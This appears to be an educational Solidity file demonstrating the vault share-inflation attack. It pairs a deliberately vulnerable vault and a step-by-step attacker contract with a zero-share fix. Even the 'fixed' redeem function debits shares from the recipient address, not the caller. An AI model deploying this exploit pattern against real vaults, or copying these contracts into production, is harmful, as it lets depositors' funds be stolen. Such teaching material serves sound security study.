// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// A minimal share vault (ERC-4626 style): deposit assets -> get shares; redeem shares -> assets.
// Shares are minted PROPORTIONALLY: assets * totalShares / totalAssets, ROUNDED DOWN.
// ❌ VULNERABLE — nothing stops an attacker inflating the share price on an almost-empty vault.
contract Vault {
    uint256 public totalShares;
    uint256 public totalAssets;
    mapping(address => uint256) public shares;
    function depositFor(uint256 assets, address to) public returns (uint256 s) {
        s = totalShares == 0 ? assets : assets * totalShares / totalAssets;   // rounds DOWN
        shares[to] += s; totalShares += s; totalAssets += assets;
    }
    function donate(uint256 assets) external { totalAssets += assets; }        // raises assets, mints NO shares
    function redeem(uint256 s, address to) external returns (uint256 assets) {
        assets = s * totalAssets / totalShares;
        shares[to] -= s; totalShares -= s; totalAssets -= assets;
    }
    function sharePrice() external view returns (uint256) {
        return totalShares == 0 ? 0 : totalAssets / totalShares;               // assets per 1 share
    }
}

// ✅ FIXED — reject any deposit that would mint ZERO shares (the precision robbery).
// (Production-grade: also seed 'dead shares' or use a virtual shares+assets offset — see README.)
contract VaultFixed {
    uint256 public totalShares;
    uint256 public totalAssets;
    mapping(address => uint256) public shares;
    function depositFor(uint256 assets, address to) public returns (uint256 s) {
        s = totalShares == 0 ? assets : assets * totalShares / totalAssets;
        require(s > 0, "zero shares");                                         // <-- the fix
        shares[to] += s; totalShares += s; totalAssets += assets;
    }
    function donate(uint256 assets) external { totalAssets += assets; }
    function redeem(uint256 s, address to) external returns (uint256 assets) {
        assets = s * totalAssets / totalShares;
        shares[to] -= s; totalShares -= s; totalAssets -= assets;
    }
    function sharePrice() external view returns (uint256) {
        return totalShares == 0 ? 0 : totalAssets / totalShares;
    }
}

// ▶ Attacker vs the VULNERABLE vault. Do it MANUALLY, step by step:
//   seed() -> inflate() -> sharePrice() -> victimDeposit() -> victimShares() -> steal() -> myLoot()
contract Attacker_OLD {
    Vault public vault;
    address public victim = address(0xBEEF);
    uint256 public spent;
    uint256 public got;
    constructor() { vault = new Vault(); }
    function seed()          external { vault.depositFor(1, address(this)); spent += 1; }         // 1 wei -> 1 share
    function inflate()       external { vault.donate(10000 ether); spent += 10000 ether; }        // pump share price
    function victimDeposit() external { vault.depositFor(10000 ether, victim); }                  // victim -> 0 shares
    function steal()         external { got += vault.redeem(vault.shares(address(this)), address(this)); }
    function sharePrice()    external view returns (uint256) { return vault.sharePrice() / 1e18; }
    function victimShares()  external view returns (uint256) { return vault.shares(victim); }
    function myLoot()        external view returns (uint256) { return got > spent ? (got - spent) / 1e18 : 0; }
}

// ▶ Same attacker vs the FIXED vault. victimDeposit() now reverts.
contract Attacker_NEW {
    VaultFixed public vault;
    address public victim = address(0xBEEF);
    uint256 public spent;
    uint256 public got;
    constructor() { vault = new VaultFixed(); }
    function seed()          external { vault.depositFor(1, address(this)); spent += 1; }
    function inflate()       external { vault.donate(10000 ether); spent += 10000 ether; }
    function victimDeposit() external { vault.depositFor(10000 ether, victim); }                  // reverts "zero shares"
    function steal()         external { got += vault.redeem(vault.shares(address(this)), address(this)); }
    function sharePrice()    external view returns (uint256) { return vault.sharePrice() / 1e18; }
    function victimShares()  external view returns (uint256) { return vault.shares(victim); }
    function myLoot()        external view returns (uint256) { return got > spent ? (got - spent) / 1e18 : 0; }
}
